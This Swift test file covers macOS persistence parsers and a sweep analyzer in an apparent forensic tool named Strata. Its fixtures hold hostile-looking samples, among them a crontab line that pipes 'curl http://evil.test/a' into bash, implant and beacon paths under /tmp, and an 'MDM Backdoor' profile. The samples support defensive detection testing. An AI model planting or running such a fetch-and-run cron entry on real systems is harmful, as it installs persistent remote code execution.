//
//  MacPersistenceParserTests.swift
//  StrataTests
//
//  Covers the non-launchd macOS persistence parsers (cron, periodic, emond,
//  login/logout hooks, rc scripts, configuration profiles) and the
//  MacPersistenceSweepAnalyzer detections over them.
//

import Testing
import Foundation
@testable import Strata

struct MacPersistenceParserTests {

    private func plist(_ object: Any) -> Data {
        try! PropertyListSerialization.data(fromPropertyList: object, format: .xml, options: 0)
    }

    // MARK: - Cron

    @Test func systemCrontabParsesUserColumn() {
        let text = """
        # comment
        SHELL=/bin/sh
        0 3 * * * root /usr/local/bin/backup.sh
        @reboot operator /tmp/.x/implant
        """
        let items = MacPersistenceParser.parseCrontab(text, sourceFile: "/etc/crontab",
                                                      defaultUser: nil, isSystemCrontab: true)
        #expect(items.count == 2)
        #expect(items[0].schedule == "0 3 * * *")
        #expect(items[0].user == "root")
        #expect(items[0].command == "/usr/local/bin/backup.sh")
        #expect(items[1].schedule == "@reboot")
        #expect(items[1].user == "operator")
        #expect(items[1].command == "/tmp/.x/implant")
    }

    @Test func userSpoolCrontabRunsAsOwner() {
        let text = "*/5 * * * * curl http://evil.test/a | bash\n"
        let items = MacPersistenceParser.parseCrontab(text, sourceFile: "/private/var/at/tabs/jane",
                                                      defaultUser: "jane", isSystemCrontab: false)
        #expect(items.count == 1)
        #expect(items[0].user == "jane")
        #expect(items[0].schedule == "*/5 * * * *")
        #expect(items[0].command == "curl http://evil.test/a | bash")
    }

    // MARK: - emond

    @Test func emondRunCommandActionExtracted() {
        let data = plist([
            [
                "name": "evil-rule",
                "enabled": true,
                "eventTypes": ["startup"],
                "actions": [
                    ["type": "RunCommand", "command": "/tmp/.beacon", "arguments": ["-q"], "user": "root"],
                    ["type": "SendEmail"],   // non-command action ignored
                ],
            ],
        ])
        let items = MacPersistenceParser.parseEmondRules(data, sourceFile: "/etc/emond.d/rules/evil.plist")
        #expect(items.count == 1)
        #expect(items[0].kind == .emond)
        #expect(items[0].name == "evil-rule")
        #expect(items[0].command == "/tmp/.beacon -q")
        #expect(items[0].user == "root")
        #expect(items[0].detail == "startup")
    }

    // MARK: - Login hooks

    @Test func loginWindowHooksExtracted() {
        let data = plist(["LoginHook": "/usr/local/bin/in.sh", "LogoutHook": "/usr/local/bin/out.sh"])
        let items = MacPersistenceParser.parseLoginWindow(data, sourceFile: "/var/root/Library/Preferences/com.apple.loginwindow.plist")
        #expect(items.count == 2)
        #expect(items.contains { $0.kind == .loginHook && $0.command == "/usr/local/bin/in.sh" })
        #expect(items.contains { $0.kind == .logoutHook && $0.command == "/usr/local/bin/out.sh" })
    }

    @Test func loginWindowWithoutHooksYieldsNothing() {
        let data = plist(["lastUser": "jane"])
        #expect(MacPersistenceParser.parseLoginWindow(data, sourceFile: "x").isEmpty)
    }

    // MARK: - rc + periodic + profile

    @Test func rcScriptCapturesCommandPreview() {
        let item = MacPersistenceParser.rcScript(path: "/etc/rc.local",
                                                 contents: "#!/bin/sh\n# header\n/tmp/.x/run &\necho done\n")
        #expect(item.kind == .rcScript)
        #expect(item.name == "rc.local")
        #expect(item.command == "/tmp/.x/run & ; echo done")
    }

    @Test func periodicScriptCadenceFromPath() {
        let item = MacPersistenceParser.periodicScript(path: "/usr/local/etc/periodic/daily/666.evil")
        #expect(item.kind == .periodic)
        #expect(item.schedule == "daily")
        #expect(item.name == "666.evil")
    }

    @Test func configProfileDisplayName() {
        let data = plist(["PayloadDisplayName": "MDM Backdoor", "PayloadIdentifier": "com.evil.mdm"])
        let item = MacPersistenceParser.configProfile(data, sourceFile: "/x/evil.mobileconfig")
        #expect(item?.kind == .configProfile)
        #expect(item?.name == "MDM Backdoor")
        #expect(item?.detail == "com.evil.mdm")
    }
}

struct MacPersistenceSweepAnalyzerTests {
    private let analyzer = MacPersistenceSweepAnalyzer()

    @Test func emondAndHooksAlwaysFlagged() {
        let items = [
            MacPersistenceItem(kind: .emond, command: "/tmp/.beacon", name: "r", sourceFile: "a"),
            MacPersistenceItem(kind: .loginHook, command: "/usr/local/bin/in.sh", sourceFile: "b"),
        ]
        let findings = analyzer.analyze(items)
        #expect(findings.count == 2)
        #expect(findings.allSatisfy { $0.severity == .high })
    }

    @Test func benignCronNotFlaggedButSuspiciousIs() {
        let benign = MacPersistenceItem(kind: .cron, schedule: "0 3 * * *",
                                        command: "/usr/sbin/diskutil verifyVolume /", sourceFile: "a")
        #expect(analyzer.analyze([benign]).isEmpty)

        let reboot = MacPersistenceItem(kind: .cron, schedule: "@reboot",
                                        command: "/tmp/.x/implant", sourceFile: "b")
        #expect(analyzer.analyze([reboot]).count == 1)
    }

    @Test func rcLocalFlaggedRcCommonNot() {
        let local = MacPersistenceItem(kind: .rcScript, command: "x", name: "rc.local", sourceFile: "a")
        let common = MacPersistenceItem(kind: .rcScript, command: "x", name: "rc.common", sourceFile: "b")
        #expect(analyzer.analyze([local]).count == 1)
        #expect(analyzer.analyze([common]).isEmpty)
    }

    @Test func configProfileNeverFlagged() {
        let p = MacPersistenceItem(kind: .configProfile, name: "MDM", sourceFile: "a")
        #expect(analyzer.analyze([p]).isEmpty)
    }
}
